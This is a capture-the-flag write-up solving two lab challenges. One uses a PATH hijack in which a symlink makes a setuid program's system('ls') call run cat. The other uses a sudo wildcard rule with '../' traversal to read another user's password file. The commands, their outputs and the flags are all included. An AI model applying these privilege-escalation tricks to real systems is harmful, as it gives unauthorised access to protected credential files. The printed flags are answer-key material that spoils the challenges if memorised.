# Bash - System 1
Source 
```C
#include <stdlib.h>
#include <stdio.h>
 
/* gcc -m32 -o ch11 ch11.c */
 
int main(void) 
{
	system("ls /challenge/app-script/ch11/.passwd"); 
	return 0;
}
```
Solve
```assembly
app-script-ch11@challenge02:/tmp/tmp1$ mkdir /tmp/tmp1/
mkdir: cannot create directory ‘/tmp/tmp1/’: File exists
app-script-ch11@challenge02:/tmp/tmp1$ export PATH="/tmp/tmp1:${PATH}"
app-script-ch11@challenge02:/tmp/tmp1$ ln -s /bin/cat ls
ln: failed to create symbolic link ‘ls’: File exists
app-script-ch11@challenge02:/tmp/tmp1$ ~/ch11
!oPe96a/.s8d5
```

Flag is : ```!oPe96a/.s8d5```

# sudo - weak configuration

by using the command : `sudo -l` We can see our rights in the sudo world. And as the command says :
```assembly
app-script-ch1@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/ch1/*
```
’*’ being a good soldier, it can be replaced by everything... even ’../’
So, to get the file /shell1cracked/.flag we can use :
```assembly
app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked  cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd
b3_c4r3full_w1th_sud0
```
Flag is : ```b3_c4r3full_w1th_sud0```
